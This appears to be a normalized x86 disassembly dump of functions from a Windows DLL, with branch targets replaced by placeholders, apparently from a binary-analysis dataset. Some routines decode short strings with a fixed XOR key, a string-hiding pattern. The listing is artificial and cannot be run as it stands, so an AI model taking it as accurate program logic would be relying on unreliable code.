inc esi
dec [ ebp - 0x50 ]
mov [ ebp + 0x14 ] eax
mov eax [ edi + 0x14 ]
and eax 0x1c0
cmp eax 0x40
je r-xdata
push 0x30
push [ ebp - 0x58 ]
sub eax esi
push eax
lea ecx [ ebp - 0x2c ]
call sub_100502f0
push 0x30
push [ ebp - 0x5c ]
lea ecx [ ebp - 0x2c ]
call sub_10042a70
mov eax [ ebp - 0x70 ]
mov [ ebp - 0x5c ] ebx
push 0x30
lea ecx [ ebp - 0x2c ]
cmp [ ebp - 0x4c ] ebx
jne r-xdata
push 0x1
push ecx
push [ eax + 0x4 ]
push [ eax ]
lea eax [ ebp - 0x6c ]
push eax
push [ ebp - 0x54 ]
call sub_100293e8
mov ecx [ eax ]
sub [ ebp - 0x50 ] ebx
mov [ ebp + 0x10 ] ecx
mov eax [ eax + 0x4 ]
add esp 0x18
add esi ebx
mov [ ebp + 0x14 ] eax
xor ebx ebx
mov ecx r--data
mov ebx [ ebp - 0x4c ]
push [ ebp - 0x64 ]
sub ebx esi
lea eax [ ebx + 0x1 ]
push eax
call sub_100502f0
push 0x30
push [ ebp - 0x5c ]
lea ecx [ ebp - 0x2c ]
push ebx
call sub_100502f0
and [ ebp - 0x64 ] 0x0
xor ebx ebx
push [ ebp - 0x5c ]
call sub_10042a70
jmp r-xdata
cmp [ ebp - 0x18 ] 0x10
mov eax [ ebp - 0x2c ]
jae r-xdata
lea esi [ ebp - 0x48 ]
cmp [ ebp - 0x34 ] 0x10
mov esi [ ebp - 0x48 ]
mov [ ebp - 0x5c ] ebx
jae r-xdata
lea ecx [ ebp - 0x60 ]
push ecx
push eax
call sub_1007f530
pop ecx
pop ecx
mov [ ebp - 0x4c ] eax
jmp r-xdata
lea eax [ ebp - 0x2c ]
mov al [ esi ]
cmp al 0x7f
jne r-xdata
test al al
jle r-xdata
cmp [ ebp - 0x18 ] 0x10
mov esi [ ebp - 0x2c ]
jae r-xdata
mov ecx [ ebp - 0x4c ]
sub ecx [ ebp - 0x78 ]
movsx eax al
cmp eax ecx
jae r-xdata
mov eax [ ebp - 0x1c ]
mov [ ebp - 0x58 ] ebx
mov [ ebp - 0x50 ] eax
lea esi [ ebp - 0x2c ]
sub [ ebp - 0x4c ] eax
push ebx
push 0x1
push [ ebp - 0x4c ]
lea ecx [ ebp - 0x2c ]
call sub_100502f0
lea eax [ esi + 0x1 ]
cmp [ eax ] 0x0
jle r-xdata
mov esi eax
sub_100668f6
push 0x10
mov eax sub_10085157
call sub_100259bb
mov esi ecx
mov [ ebp - 0x18 ] esi
call sub_1003d7d5
xor ebx ebx
mov edi eax
mov [ esi + 0x8 ] ebx
mov [ esi + 0x10 ] ebx
mov [ esi + 0x14 ] ebx
mov [ ebp - 0x4 ] ebx
cmp [ ebp + 0xc ] bl
je r-xdata
mov eax [ edi + 0x8 ]
mov [ ebp - 0x14 ] eax
mov [ ebp - 0x14 ] r--data
jmp r-xdata
call sub_10008d33
retn 0x8
call sub_100575c5
mov [ esi + 0xc ] 0x2e
call sub_100575c5
mov [ esi + 0xd ] 0x2c
call sub_100575c5
lea eax [ ebp - 0x1c ]
push eax
push ebx
push [ ebp - 0x14 ]
call sub_10003340
add esp 0xc
mov [ esi + 0x8 ] eax
call sub_100575c5
lea eax [ ebp - 0x1c ]
push eax
push ebx
push r--data
call sub_10003340
add esp 0xc
mov [ esi + 0x10 ] eax
call sub_100575c5
lea eax [ ebp - 0x1c ]
push eax
push ebx
push r--data
call sub_10003340
add esp 0xc
mov [ esi + 0x14 ] eax
call sub_100575c5
mov eax [ edi ]
mov al [ eax ]
mov [ esi + 0xc ] al
call sub_100575c5
mov eax [ edi + 0x4 ]
mov al [ eax ]
mov [ esi + 0xd ] al
cmp [ ebp + 0xc ] bl
je r-xdata
sub_100669c6
mov edi edi
push ebp
mov ebp esp
push ecx
push [ ebp + 0x14 ]
push [ ebp + 0x10 ]
push [ ebp + 0xc ]
push [ ebp + 0x8 ]
call sub_10024808
fstp [ ebp - 0x4 ]
fld [ ebp - 0x4 ]
add esp 0x10
leave
retn
sub_100669f0
push ebp
mov ebp esp
push ecx
push ebx
push esi
mov esi [ edi ]
test esi esi
je r-xdata
push 0x8
push 0x40
call [ LocalAlloc@IAT ]
mov [ edi ] eax
test eax eax
jne r-xdata
cmp [ esi + 0x4 ] 0x0
je r-xdata
mov esi eax
mov eax 0x2
pop esi
pop ebx
pop ecx
pop ebp
retn 0x4
push 0x8
push 0x40
call [ LocalAlloc@IAT ]
mov [ esi + 0x4 ] eax
mov esi eax
test esi esi
jne r-xdata
mov esi [ esi + 0x4 ]
cmp [ esi + 0x4 ] 0x0
jne r-xdata
xor eax eax
mov ebx [ ebp + 0x8 ]
mov ecx eax
call sub_1006f010
jmp r-xdata
push 0x20
push 0x0
call [ GetProcessHeap@IAT ]
push eax
call [ HeapAlloc@IAT ]
test eax eax
je r-xdata
lea eax [ esi + 0x1 ]
pop esi
pop ebx
pop ecx
pop ebp
retn 0x4
mov [ esi + 0x4 ] 0x0
pop esi
xor eax eax
pop ebx
pop ecx
pop ebp
retn 0x4
mov [ esi ] eax
test eax eax
je r-xdata
sub_10066a7f
mov edi edi
push ebp
mov ebp esp
test [ ebp + 0x8 ] 0x1
push esi
mov esi ecx
mov [ esi ] r--data
je r-xdata
mov eax esi
pop esi
pop ebp
retn 0x4
push esi
call sub_1000a86e
pop ecx
sub_10066ab0
push ebp
mov ebp esp
push 0xffffffff
push sub_10086c89
mov eax [ fs : 0x0 ]
push eax
push ecx
push esi
push edi
mov eax [ rw-data ]
xor eax ebp
push eax
lea eax [ ebp - 0xc ]
mov [ fs : 0x0 ] eax
mov esi [ ebp + 0x8 ]
mov [ ebp - 0x10 ] 0x0
mov [ esi + 0x14 ] 0xf
mov [ esi + 0x10 ] 0x0
mov [ esi ] 0x0
mov eax [ ebp + 0xc ]
mov ecx [ ebp + 0x10 ]
mov [ ebp - 0x4 ] 0x0
mov eax [ eax + 0x10 ]
mov ecx [ ecx + 0x10 ]
mov edi [ esi + 0x10 ]
add eax ecx
mov [ ebp - 0x10 ] 0x1
cmp edi eax
ja r-xdata
mov edx [ ebp + 0xc ]
push 0xffffffff
push 0x0
push edx
mov ecx esi
call sub_10004e10
mov eax [ ebp + 0x10 ]
push 0xffffffff
push 0x0
push eax
mov ecx esi
call sub_10004e10
mov eax esi
mov ecx [ ebp - 0xc ]
mov [ fs : 0x0 ] ecx
pop ecx
pop edi
pop esi
mov esp ebp
pop ebp
retn
cmp [ esi + 0x14 ] eax
je r-xdata
push 0x1
push eax
mov ecx esi
call sub_1003afd0
test al al
je r-xdata
cmp [ esi + 0x14 ] 0x10
mov [ esi + 0x10 ] edi
jb r-xdata
mov eax esi
mov eax [ esi ]
jmp r-xdata
mov [ eax + edi ] 0x0
sub_10066b6a
mov edi edi
push ebp
mov ebp esp
push esi
mov esi ecx
call sub_100575c5
mov ecx [ ebp + 0x8 ]
mov [ esi + 0xc ] eax
lea eax [ ebp + 0x8 ]
push eax
mov [ esi + 0x10 ] edx
call sub_10023ca4
mov ecx [ eax ]
mov [ esi + 0x8 ] ecx
and [ eax ] 0x0
push [ ebp + 0x8 ]
call sub_1001b2d2
pop ecx
pop esi
pop ebp
retn 0x4
sub_10066b9f
mov edi edi
push ebp
mov ebp esp
cmp [ ebp + 0x8 ] 0x0
je r-xdata
xor al al
mov edx [ ecx + 0x14 ]
cmp edx 0x8
jb r-xdata
mov eax ecx
mov eax [ ecx ]
jmp r-xdata
cmp edx 0x8
jb r-xdata
cmp [ ebp + 0x8 ] eax
jb r-xdata
mov eax ecx
mov eax [ ecx ]
jmp r-xdata
mov al 0x1
jmp r-xdata
mov ecx [ ecx + 0x10 ]
lea eax [ eax + ecx * 2 ]
cmp eax [ ebp + 0x8 ]
jbe r-xdata
pop ebp
retn 0x4
sub_10066bdd
mov edi edi
push ebp
mov ebp esp
push esi
push [ ebp + 0x8 ]
mov esi ecx
and [ esi + 0x10 ] 0x0
xor eax eax
mov [ esi + 0x14 ] 0x7
mov [ esi ] ax
call sub_10010de5
pop ecx
push eax
push [ ebp + 0x8 ]
mov ecx esi
call sub_1003255f
mov eax esi
pop esi
pop ebp
retn 0x4
sub_10066c10
push ebp
mov ebp esp
push 0xffffffff
push sub_10089586
mov eax [ fs : 0x0 ]
push eax
sub esp 0x27c
mov eax [ rw-data ]
xor eax ebp
mov [ ebp - 0x10 ] eax
push ebx
push esi
push edi
push eax
lea eax [ ebp - 0xc ]
mov [ fs : 0x0 ] eax
mov ebx [ rw-data ]
mov eax [ ebp + 0xc ]
mov edi [ ebx + 0x4 ]
mov esi [ ebp + 0x8 ]
movzx ecx cx
mov [ ebp - 0x270 ] eax
mov eax [ ebp + 0x10 ]
mov [ ebp - 0x274 ] ecx
mov cl [ ebp + 0x14 ]
mov [ ebp - 0x27c ] edx
mov edx [ ebp + 0x18 ]
mov [ ebp - 0x284 ] esi
mov [ ebp - 0x278 ] eax
mov [ ebp - 0x265 ] cl
mov [ ebp - 0x288 ] edx
mov [ ebp - 0x26c ] ebx
cmp edi [ ebx + 0x8 ]
je r-xdata
xor eax eax
mov edi edi
push esi
push eax
call [ StrCmpW@IAT ]
test eax eax
je r-xdata
mov eax [ eax ]
mov eax [ ebp - 0x270 ]
mov edx [ edi ]
lea esi [ eax + 0x2 ]
xor ebx ebx
mov edi edi
add edi 0x4
cmp edi [ ebx + 0x8 ]
jne r-xdata
mov cx [ eax ]
add eax 0x2
cmp cx bx
jne r-xdata
sub eax esi
sar eax 0x1
push eax
mov eax [ ebp - 0x270 ]
push eax
lea ecx [ edx + 0x4 ]
call sub_10034100
mov eax [ edi ]
mov cx [ ebp - 0x274 ]
mov esi [ ebp - 0x27c ]
mov [ eax + 0x3c ] cx
xor edx edx
mov eax esi
mov [ ebp - 0x90 ] 0x7
mov [ ebp - 0x94 ] ebx
mov [ ebp - 0xa4 ] dx
lea ecx [ eax + 0x2 ]
mov eax [ edi ]
add eax 0x20
cmp [ eax + 0x14 ] 0x8
jb r-xdata
mov dx [ eax ]
add eax 0x2
cmp dx bx
jne r-xdata
sub eax ecx
sar eax 0x1
push eax
push esi
lea ecx [ ebp - 0xa4 ]
call sub_10034100
mov edx [ ebp - 0x278 ]
lea eax [ ebp - 0xa4 ]
push eax
lea esi [ ebp - 0x14c ]
mov [ ebp - 0x4 ] ebx
call sub_100519f0
add esp 0x4
push eax
mov edx r--data
lea esi [ ebp - 0xdc ]
mov [ ebp - 0x4 ] 0x1
call sub_100519f0
add esp 0x4
mov [ ebp - 0x4 ] 0x2
cmp [ eax + 0x14 ] 0x8
jb r-xdata
mov edx eax
mov edx [ eax ]
jmp r-xdata
mov cx [ eax ]
add eax 0x2
cmp cx bx
jne r-xdata
sub eax [ ebp - 0x280 ]
lea ecx [ esi + 0x40 ]
sar eax 0x1
push eax
push edx
call sub_10034100
mov esi 0x8
cmp [ ebp - 0xc8 ] esi
jb r-xdata
mov esi [ edi ]
mov eax edx
lea ecx [ eax + 0x2 ]
mov [ ebp - 0x280 ] ecx
nop
xor eax eax
mov [ ebp - 0xc8 ] 0x7
mov [ ebp - 0xcc ] ebx
mov [ ebp - 0xdc ] ax
cmp [ ebp - 0x138 ] esi
jb r-xdata
mov edx [ ebp - 0xdc ]
push edx
call sub_1000a86e
add esp 0x4
xor edx edx
mov [ ebp - 0x4 ] 0xffffffff
mov [ ebp - 0x138 ] 0x7
mov [ ebp - 0x13c ] ebx
mov [ ebp - 0x14c ] dx
cmp [ ebp - 0x90 ] esi
jb r-xdata
mov ecx [ ebp - 0x14c ]
push ecx
call sub_1000a86e
add esp 0x4
mov eax [ edi ]
mov cl [ ebp - 0x265 ]
mov edx [ ebp + 0x1c ]
mov [ eax + 0x3e ] cl
mov eax [ edi ]
mov [ eax + 0xcc ] edx
mov edx [ ebp - 0x288 ]
cmp edx ebx
je r-xdata
mov eax [ ebp - 0xa4 ]
push eax
call sub_1000a86e
add esp 0x4
mov ecx [ ebp - 0x26c ]
mov eax [ ecx + 0x8 ]
mov ecx [ ecx + 0x4 ]
mov edx eax
sub edx ecx
push sub_1003a6a0
sar edx 0x2
push edx
push eax
push ecx
call sub_10069070
mov ecx [ r--data ]
add esp 0x10
xor eax eax
jmp r-xdata
mov edi [ edi ]
mov eax edx
lea esi [ eax + 0x2 ]
movsx edx [ eax + ecx ]
xor edx eax
xor edx 0xffe5
and edx 0xff
mov [ ebp + eax * 2 - 0x34 ] dx
inc eax
cmp eax 0x11
jb r-xdata
mov cx [ eax ]
add eax 0x2
cmp cx bx
jne r-xdata
sub eax esi
sar eax 0x1
push eax
push edx
lea ecx [ edi + 0x20 ]
call sub_10034100
mov edx [ ebp - 0x278 ]
xor eax eax
mov [ ebp - 0x12 ] ax
mov esi 0x7
xor ecx ecx
mov eax edx
mov [ ebp - 0xac ] esi
mov [ ebp - 0xb0 ] ebx
mov [ ebp - 0xc0 ] cx
lea edi [ eax + 0x2 ]
jmp r-xdata
mov cx [ eax ]
add eax 0x2
cmp cx bx
jne r-xdata
sub eax edi
sar eax 0x1
push eax
push edx
lea ecx [ ebp - 0xc0 ]
call sub_10034100
mov edi [ ebp - 0x27c ]
mov [ ebp - 0x4 ] 0x3
xor edx edx
mov eax edi
mov [ ebp - 0x58 ] esi
mov [ ebp - 0x5c ] ebx
mov [ ebp - 0x6c ] dx
lea ecx [ eax + 0x2 ]
lea ebx [ ebx ]
mov dx [ eax ]
add eax 0x2
cmp dx bx
jne r-xdata
sub eax ecx
sar eax 0x1
push eax
push edi
lea ecx [ ebp - 0x6c ]
call sub_10034100
movzx eax [ ebp - 0x274 ]
push eax
lea ecx [ ebp - 0x1d8 ]
push ecx
mov [ ebp - 0x4 ] 0x4
call sub_10057f20
add esp 0x8
mov [ ebp - 0x26c ] eax
mov edi [ ebp - 0x270 ]
mov [ ebp - 0x4 ] 0x5
xor edx edx
mov eax edi
mov [ ebp - 0x3c ] esi
mov [ ebp - 0x40 ] ebx
mov [ ebp - 0x50 ] dx
lea ecx [ eax + 0x2 ]
mov dx [ eax ]
add eax 0x2
cmp dx bx
jne r-xdata
sub eax ecx
sar eax 0x1
push eax
push edi
lea ecx [ ebp - 0x50 ]
call sub_10034100
mov edx [ ebp - 0x284 ]
mov [ ebp - 0x4 ] 0x6
xor eax eax
mov [ ebp - 0x88 ] ax
mov eax edx
mov [ ebp - 0x74 ] esi
mov [ ebp - 0x78 ] ebx
lea ecx [ eax + 0x2 ]
lea esp [ esp ]
mov si [ eax ]
add eax 0x2
cmp si bx
jne r-xdata
sub eax ecx
sar eax 0x1
push eax
push edx
lea ecx [ ebp - 0x88 ]
call sub_10034100
movzx ecx [ ebp - 0x265 ]
push ecx
lea edx [ ebp - 0x168 ]
push edx
mov [ ebp - 0x4 ] 0x7
call sub_10057f20
push eax
lea edx [ ebp - 0x34 ]
lea esi [ ebp - 0x264 ]
mov [ ebp - 0x4 ] 0x8
call sub_10040e00
add esp 0xc
push eax
mov edx r--data
lea esi [ ebp - 0x22c ]
mov [ ebp - 0x4 ] 0x9
call sub_100519f0
add esp 0x4
mov ecx eax
lea eax [ ebp - 0x88 ]
lea edi [ ebp - 0x1f4 ]
mov [ ebp - 0x4 ] 0xa
call sub_1006b070
push eax
mov edx r--data
lea esi [ ebp - 0x1bc ]
mov [ ebp - 0x4 ] 0xb
call sub_100519f0
add esp 0x4
mov ecx eax
lea eax [ ebp - 0x50 ]
lea edi [ ebp - 0x184 ]
mov [ ebp - 0x4 ] 0xc
call sub_1006b070
push eax
mov edx r--data
lea esi [ ebp - 0x130 ]
mov [ ebp - 0x4 ] 0xd
call sub_100519f0
add esp 0x4
mov ecx eax
mov eax [ ebp - 0x26c ]
lea edi [ ebp - 0x114 ]
mov [ ebp - 0x4 ] 0xe
call sub_1006b070
push eax
mov edx r--data
lea esi [ ebp - 0x210 ]
mov [ ebp - 0x4 ] 0xf
call sub_100519f0
add esp 0x4
mov ecx eax
lea eax [ ebp - 0x6c ]
lea edi [ ebp - 0xf8 ]
mov [ ebp - 0x4 ] 0x10
call sub_1006b070
push eax
mov edx r--data
lea esi [ ebp - 0x1a0 ]
mov [ ebp - 0x4 ] 0x11
call sub_100519f0
add esp 0x4
mov ecx eax
lea eax [ ebp - 0xc0 ]
lea edi [ ebp - 0x248 ]
mov [ ebp - 0x4 ] 0x12
call sub_1006b070
mov edx eax
mov ecx 0xca
mov [ ebp - 0x4 ] 0x13
call sub_10022b50
mov esi 0x8
cmp [ ebp - 0x234 ] esi
jb r-xdata
xor ecx ecx
mov edi 0x7
mov [ ebp - 0x234 ] edi
mov [ ebp - 0x238 ] ebx
mov [ ebp - 0x248 ] cx
cmp [ ebp - 0x18c ] esi
jb r-xdata
mov eax [ ebp - 0x248 ]
push eax
call sub_1000a86e
add esp 0x4
xor eax eax
mov [ ebp - 0x18c ] edi
mov [ ebp - 0x190 ] ebx
mov [ ebp - 0x1a0 ] ax
cmp [ ebp - 0xe4 ] esi
jb r-xdata
mov edx [ ebp - 0x1a0 ]
push edx
call sub_1000a86e
add esp 0x4
xor edx edx
mov [ ebp - 0xe4 ] edi
mov [ ebp - 0xe8 ] ebx
mov [ ebp - 0xf8 ] dx
cmp [ ebp - 0x1fc ] esi
jb r-xdata
mov ecx [ ebp - 0xf8 ]
push ecx
call sub_1000a86e
add esp 0x4
xor ecx ecx
mov [ ebp - 0x1fc ] edi
mov [ ebp - 0x200 ] ebx
mov [ ebp - 0x210 ] cx
cmp [ ebp - 0x100 ] esi
jb r-xdata
mov eax [ ebp - 0x210 ]
push eax
call sub_1000a86e
add esp 0x4
xor eax eax
mov [ ebp - 0x100 ] edi
mov [ ebp - 0x104 ] ebx
mov [ ebp - 0x114 ] ax
cmp [ ebp - 0x11c ] esi
jb r-xdata
mov edx [ ebp - 0x114 ]
push edx
call sub_1000a86e
add esp 0x4
xor edx edx
mov [ ebp - 0x11c ] edi
mov [ ebp - 0x120 ] ebx
mov [ ebp - 0x130 ] dx
cmp [ ebp - 0x170 ] esi
jb r-xdata
mov ecx [ ebp - 0x130 ]
push ecx
call sub_1000a86e
add esp 0x4
xor ecx ecx
mov [ ebp - 0x170 ] edi
mov [ ebp - 0x174 ] ebx
mov [ ebp - 0x184 ] cx
cmp [ ebp - 0x1a8 ] esi
jb r-xdata
mov eax [ ebp - 0x184 ]
push eax
call sub_1000a86e
add esp 0x4
xor eax eax
mov [ ebp - 0x1a8 ] edi
mov [ ebp - 0x1ac ] ebx
mov [ ebp - 0x1bc ] ax
cmp [ ebp - 0x1e0 ] esi
jb r-xdata
mov edx [ ebp - 0x1bc ]
push edx
call sub_1000a86e
add esp 0x4
xor edx edx
mov [ ebp - 0x1e0 ] edi
mov [ ebp - 0x1e4 ] ebx
mov [ ebp - 0x1f4 ] dx
cmp [ ebp - 0x218 ] esi
jb r-xdata
mov ecx [ ebp - 0x1f4 ]
push ecx
call sub_1000a86e
add esp 0x4
xor ecx ecx
mov [ ebp - 0x218 ] edi
mov [ ebp - 0x21c ] ebx
mov [ ebp - 0x22c ] cx
cmp [ ebp - 0x250 ] esi
jb r-xdata
mov eax [ ebp - 0x22c ]
push eax
call sub_1000a86e
add esp 0x4
xor eax eax
mov [ ebp - 0x250 ] edi
mov [ ebp - 0x254 ] ebx
mov [ ebp - 0x264 ] ax
cmp [ ebp - 0x154 ] esi
jb r-xdata
mov edx [ ebp - 0x264 ]
push edx
call sub_1000a86e
add esp 0x4
xor edx edx
mov [ ebp - 0x154 ] edi
mov [ ebp - 0x158 ] ebx
mov [ ebp - 0x168 ] dx
cmp [ ebp - 0x74 ] esi
jb r-xdata
mov ecx [ ebp - 0x168 ]
push ecx
call sub_1000a86e
add esp 0x4
xor ecx ecx
mov [ ebp - 0x74 ] edi
mov [ ebp - 0x78 ] ebx
mov [ ebp - 0x88 ] cx
cmp [ ebp - 0x3c ] esi
jb r-xdata
mov eax [ ebp - 0x88 ]
push eax
call sub_1000a86e
add esp 0x4
xor eax eax
mov [ ebp - 0x3c ] edi
mov [ ebp - 0x40 ] ebx
mov [ ebp - 0x50 ] ax
cmp [ ebp - 0x1c4 ] esi
jb r-xdata
mov edx [ ebp - 0x50 ]
push edx
call sub_1000a86e
add esp 0x4
xor edx edx
mov [ ebp - 0x1c4 ] edi
mov [ ebp - 0x1c8 ] ebx
mov [ ebp - 0x1d8 ] dx
cmp [ ebp - 0x58 ] esi
jb r-xdata
mov ecx [ ebp - 0x1d8 ]
push ecx
call sub_1000a86e
add esp 0x4
xor ecx ecx
mov [ ebp - 0x58 ] edi
mov [ ebp - 0x5c ] ebx
mov [ ebp - 0x6c ] cx
cmp [ ebp - 0xac ] esi
jb r-xdata
mov eax [ ebp - 0x6c ]
push eax
call sub_1000a86e
add esp 0x4
mov eax 0x1
jmp r-xdata
mov edx [ ebp - 0xc0 ]
push edx
call sub_1000a86e
add esp 0x4
mov ecx [ ebp - 0xc ]
mov [ fs : 0x0 ] ecx
pop ecx
pop edi
pop esi
pop ebx
mov ecx [ ebp - 0x10 ]
xor ecx ebp
call sub_10032529
mov esp ebp
pop ebp
retn 0x18
sub_100673e0
mov eax [ esi + 0x8 ]
mov ecx [ eax ]
mov edx [ ecx ]
push edi
lea edi [ esi + 0x10 ]
push edi
push r--data
push eax
call edx
mov [ esi ] eax
mov eax [ esi + 0x8 ]
mov ecx [ eax ]
mov edx [ ecx + 0x8 ]
push eax
call edx
cmp [ esi ] 0x0
jl r-xdata
call [ CoUninitialize@IAT ]
mov eax [ esi ]
pop edi
retn
mov eax [ edi ]
mov ecx [ eax ]
mov edx [ ecx + 0x18 ]
push 0x1
push 0x0
push eax
call edx
mov edi [ edi ]
mov [ esi ] eax
mov eax [ edi ]
mov ecx [ eax + 0x8 ]
push edi
call ecx
sub_1006742a
push 0x4c
mov eax sub_10086096
call sub_10047689
mov eax [ ebp + 0x20 ]
mov edx [ ebp + 0x28 ]
mov esi [ ebp + 0x8 ]
mov edi [ ebp + 0x24 ]
push eax
push [ ebp + 0x1c ]
lea eax [ ebp + 0x14 ]
push eax
lea eax [ ebp + 0xc ]
push eax
lea eax [ ebp - 0x2c ]
push eax
mov [ ebp - 0x58 ] esi
mov [ ebp - 0x50 ] edx
call sub_1004327d
lea eax [ ebp + 0x14 ]
xor ebx ebx
push eax
lea ecx [ ebp + 0xc ]
mov [ ebp - 0x4 ] ebx
call sub_1006995b
test al al
je r-xdata
cmp [ ebp - 0x1c ] ebx
jne r-xdata
or [ edi ] 0x1
mov [ ebp - 0x34 ] 0xf
mov [ ebp - 0x38 ] ebx
mov [ ebp - 0x48 ] bl
push [ ebp - 0x1c ]
lea ecx [ ebp - 0x48 ]
mov [ ebp - 0x4 ] 0x1
call sub_10053fd0
mov eax [ ebp - 0x2c ]
xor esi esi
cmp [ ebp - 0x18 ] 0x10
jae r-xdata
or [ edi ] 0x2
jmp r-xdata
cmp [ eax ] 0x30
jl r-xdata
lea eax [ ebp - 0x2c ]
mov eax [ ebp + 0xc ]
mov [ esi ] eax
mov eax [ ebp + 0x10 ]
push ebx
push 0x1
lea ecx [ ebp - 0x2c ]
mov [ esi + 0x4 ] eax
call sub_10005b50
mov eax esi
call sub_100262c3
retn 0x24
xor esi esi
push 0x2d
inc esi
push esi
lea ecx [ ebp - 0x48 ]
call sub_10042a70
jmp r-xdata
cmp [ ebp - 0x18 ] 0x10
mov eax [ ebp - 0x2c ]
jae r-xdata
cmp esi [ ebp - 0x1c ]
jb r-xdata
cmp [ eax ] 0x39
jle r-xdata
lea eax [ ebp - 0x2c ]
cmp [ ebp - 0x18 ] 0x10
mov eax [ ebp - 0x2c ]
jae r-xdata
cmp [ ebp - 0x34 ] 0x10
mov esi [ ebp - 0x48 ]
jae r-xdata
movzx eax [ eax + esi ]
push eax
push 0x1
lea ecx [ ebp - 0x48 ]
call sub_10042a70
inc esi
lea eax [ ebp - 0x2c ]
lea eax [ ebp - 0x4c ]
push eax
push ebx
lea eax [ ebp - 0x54 ]
push eax
push esi
mov [ ebp - 0x4c ] ebx
call sub_1001f911
add esp 0x10
cmp [ ebp - 0x54 ] esi
je r-xdata
lea esi [ ebp - 0x48 ]
or [ edi ] 0x2
fstp st0
cmp [ ebp - 0x4c ] ebx
jne r-xdata
mov eax [ ebp - 0x50 ]
fstp [ eax ]
jmp r-xdata
push ebx
push 0x1
lea ecx [ ebp - 0x48 ]
call sub_10005b50
mov esi [ ebp - 0x58 ]
sub_10067560
push ebp
mov ebp esp
push esi
mov esi ecx
mov ecx [ esi + 0x10 ]
push edi
cmp ecx [ ebp + 0x8 ]
jb r-xdata
push r--data
call sub_100651be
mov eax [ ebp + 0xc ]
mov eax [ eax + 0x10 ]
mov edx [ ebp + 0x10 ]
cmp eax edx
jb r-xdata
mov edi [ ebp + 0x14 ]
sub eax edx
cmp eax edi
jae r-xdata
or edx 0xffffffff
sub edx ecx
cmp edx edi
ja r-xdata
mov edi eax
test edi edi
je r-xdata
push r--data
call sub_10030594
pop edi
mov eax esi
pop esi
pop ebp
retn 0x10
push ebx
lea ebx [ ecx + edi ]
mov [ ebp + 0x14 ] ebx
cmp ebx 0xfffffffe
jbe r-xdata
mov eax [ esi + 0x14 ]
cmp eax ebx
jae r-xdata
push r--data
call sub_10030594
test ebx ebx
jne r-xdata
push ecx
push ebx
mov ecx esi
call sub_10045c60
test ebx ebx
je r-xdata
mov eax [ esi + 0x14 ]
cmp eax 0x10
jb r-xdata
mov [ esi + 0x10 ] ebx
cmp eax 0x10
jb r-xdata
pop ebx
mov ecx esi
mov ecx [ esi ]
jmp r-xdata
pop ebx
mov eax esi
pop edi
mov [ eax ] 0x0
pop esi
pop ebp
retn 0x10
mov eax [ esi ]
mov [ eax ] bl
pop ebx
pop edi
mov eax esi
pop esi
pop ebp
retn 0x10
mov eax esi
mov eax [ esi ]
jmp r-xdata
cmp eax 0x10
jb r-xdata
mov eax 0x10
cmp [ ecx + 0x14 ] eax
jb r-xdata
mov eax [ ebp + 0x10 ]
lea edx [ eax + edi ]
cmp ebx eax
jb r-xdata
mov edx [ esi + 0x10 ]
sub edx [ ebp + 0x8 ]
mov ebx [ ebp + 0x8 ]
push edx
add ecx ebx
add eax ebx
push ecx
add eax edi
push eax
call sub_1007ec40
mov ecx [ ebp + 0xc ]
add esp 0xc
cmp esi ecx
jne r-xdata
cmp [ esi + 0x14 ] eax
jb r-xdata
mov ecx [ ecx ]
mov eax [ esi + 0x14 ]
cmp eax 0x10
jb r-xdata
mov edx eax
mov eax esi
mov eax [ esi ]
jmp r-xdata
mov ecx esi
mov ecx [ esi ]
jmp r-xdata
mov eax esi
mov [ eax + ecx ] 0x0
mov eax [ esi ]
pop ebx
mov [ eax + ecx ] 0x0
pop edi
mov eax esi
pop esi
pop ebp
retn 0x10
add ecx [ ebp + 0x10 ]
push edi
push ecx
add eax ebx
push eax
call sub_1007f580
push edi
add ecx edx
mov eax esi
push ecx
add eax ebx
push eax
call sub_1007ec40
jmp r-xdata
mov eax [ esi ]
push edi
add ecx edx
push ecx
add eax ebx
push eax
call sub_1007ec40
jmp r-xdata
cmp eax 0x10
jb r-xdata
mov ecx [ ebp + 0x14 ]
add esp 0xc
cmp [ esi + 0x14 ] 0x10
mov [ esi + 0x10 ] ecx
jb r-xdata
sub_100676d2
mov edi edi
push ebp
mov ebp esp
cmp [ ecx + 0x28 ] 0x0
jne r-xdata
mov eax r--data
mov ecx [ ebp + 0xc ]
cmp ecx 0x2
ja r-xdata
mov eax [ ebp + 0x10 ]
cmp eax 0x1
ja r-xdata
cmp [ ebp + 0x14 ] 0x4
ja r-xdata
lea eax [ eax + ecx * 2 ]
imul eax eax 0x5
add eax [ ebp + 0x14 ]
lea eax [ eax * 4 + r--data ]
jmp r-xdata
push 0x4
push eax
push 0x4
push [ ebp + 0x8 ]
call sub_1006d41a
add esp 0x10
pop ebp
retn 0x10
sub_10067720
push ebp
mov ebp esp
push esi
mov esi ecx
push edi
mov edi eax
cmp esi [ ebp + 0x8 ]
je r-xdata
pop edi
pop esi
pop ebp
retn
add esi 0x10
push ebx
mov eax [ esi + 0xc ]
mov [ edi + 0x1c ] eax
mov ecx [ esi + 0x10 ]
add esi 0x24
mov [ edi + 0x20 ] ecx
lea edx [ esi - 0x10 ]
add edi 0x24
cmp edx [ ebp + 0x8 ]
jne r-xdata
mov ebx 0x8
cmp [ edi + 0x14 ] ebx
jb r-xdata
lea eax [ esi - 0x10 ]
cmp edi eax
je r-xdata
mov eax edi
pop ebx
xor edx edx
mov [ edi + 0x14 ] 0x7
mov [ edi + 0x10 ] 0x0
mov [ edi ] dx
cmp [ esi + 0x4 ] ebx
lea ebx [ esi - 0x10 ]
jae r-xdata
mov ecx [ edi ]
push ecx
call sub_1000a86e
add esp 0x4
mov edx [ ebx ]
mov [ edi ] edx
mov [ ebx ] 0x0
mov eax [ esi ]
lea ecx [ eax + eax + 0x2 ]
push ecx
push ebx
push edi
call sub_1007ec40
add esp 0xc
jmp r-xdata
mov eax [ esi ]
mov [ edi + 0x10 ] eax
mov ecx [ esi + 0x4 ]
mov [ edi + 0x14 ] ecx
xor edx edx
mov [ esi + 0x4 ] 0x7
mov [ esi ] 0x0
mov [ ebx ] dx
sub_100677f0
push ebp
mov ebp esp
sub esp 0x9c
mov eax [ rw-data ]
xor eax ebp
mov [ ebp - 0x4 ] eax
mov ecx [ r--data ]
push ebx
xor ebx ebx
push esi
mov [ ebp - 0x9c ] ebx
mov [ ebp - 0x90 ] ebx
xor eax eax
jmp r-xdata
movsx edx [ ecx + eax ]
xor edx eax
xor edx 0x57
and edx 0xff
mov [ ebp + eax * 2 - 0x50 ] dx
inc eax
cmp eax 0x10
jb r-xdata
xor eax eax
lea edx [ ebp - 0x90 ]
push edx
